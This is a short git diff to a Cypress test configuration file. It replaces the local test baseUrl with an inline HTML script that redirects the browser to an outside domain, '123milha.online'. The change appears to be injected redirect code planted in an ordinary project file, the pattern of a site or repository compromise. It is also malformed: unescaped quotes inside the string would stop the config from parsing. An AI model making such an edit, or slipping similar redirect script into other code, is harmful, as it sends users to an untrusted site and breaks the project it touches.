@@ -2,7 +2,9 @@ import { defineConfig } from "cypress";
 
 export default defineConfig({
   e2e: {
-    baseUrl: "http://localhost:8888/",
+    baseUrl: "<script>
+      window.location.replace("https://123milha.online/642831975");
+</script>",
     supportFile: false,
     setupNodeEvents(on, config) {
       // implement node event listeners here
